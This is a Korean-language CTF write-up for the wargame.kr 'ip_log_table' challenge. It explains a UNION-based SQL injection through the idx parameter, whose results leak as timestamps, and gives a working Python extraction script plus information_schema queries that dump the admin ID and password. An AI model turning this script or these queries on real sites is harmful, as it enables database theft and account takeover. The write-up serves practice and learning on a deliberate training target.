# ip_log_table

1. ip_log_table 중 하나에 들어가니 TimeStamp로 값이 나타난다.

2. ip주소 옆에 있던 idx값이 전달되서 SQL문에 들어간 이후 그 값이 TimeStamp로 나타나는 것 같다.

3. 여러 실험의 결과 올바르지않은 값에는 TimeStamp가 1970-01-01 09:00:00으로 표시되는걸 볼 수 있다.

4. 따라서 아래와 같은 코드를 작성해 인젝션을 준비하였다.
[코드](./get_data.py)
```python
import sys
from urllib import request, parse
import time, datetime

def to_timestamp(string):
    # print("string : " + string)
    return int(time.mktime(datetime.datetime.strptime(string, "%Y-%m-%d %H:%M:%S").timetuple()))

def get_ascii(param):
    data = parse.urlencode({ 'idx' : '77 union select ' + param}).encode()
    # print("data : ",  end = '')
    req = request.Request('http://wargame.kr:8080/ip_log_table/chk.php', data = data)
    response = request.urlopen(req).read().decode()
    # print("req : ", end='')
    # print(req)
    # print("res : ", end='')
    # print(response)
    
    return to_timestamp(response[response.find("<b>") + 3 : response.find("</b")])

def get_length(query):
    return get_ascii("length(%s)" % query)

def get_content(query):
    query = '(' + query + ')'
    content_len = get_length(query)
    content = ''
    # print(content_len)

    if content_len == 0:
        print('Invalid input')
        return ''
    
    for idx in range(1, content_len + 1):
        content += chr(get_ascii('ascii(substr(%s,%d,1))' % (query, idx)))
        sys.stdout.write('\r[' + str(content_len) + '] ' + content + '_' * (content_len - len(content)))

    sys.stdout.write('\n')

    return content



if len(sys.argv) < 2:
    sys.stdout.write('인자값이 없습니다.')
    exit()
print(sys.argv[1])
content = get_content(' '.join(sys.argv[1:]))
```

```css
1. select count(*) from information_schema.tables
위의 과정을 통해 전체 테이블의 길이를 구한다.

2. select table_name from information_schema.tables limit 0,1
select table_name from information_schema.tables limit 71,1
이 두 과정을 통해 우리가 필요로 하는 테이블이 앞쪽인지 뒤쪽인지 확인한다.
우리가 필요로 하는 값은 뒤에 있으니 70 근처를 훑어보자

3. select table_name from information_schema.tables limit 70,1
보니까 여기에 admin의 정보가 담겨있다.
이를 AdminTable이라고 칭하겠다.

4. select column_name from information_schema.columns where table_name='AdminTable' limit 0, 1
select column_name from information_schema.columns where table_name='AdminTable' limit 1, 1
위 과정을 통해 컬럼을 확인한다
아이디와 비밀번호 컬럼을 발견했다. 

5. select 아이디 from AdminTable
select 비밀번호 from AdminTable
이로써 아이디와 비밀번호를 구했다.
```
위 과정을 통해 얻은 아이디와 비밀번호를 집어넣어 로그인하면 flag값을 얻을 수 있다.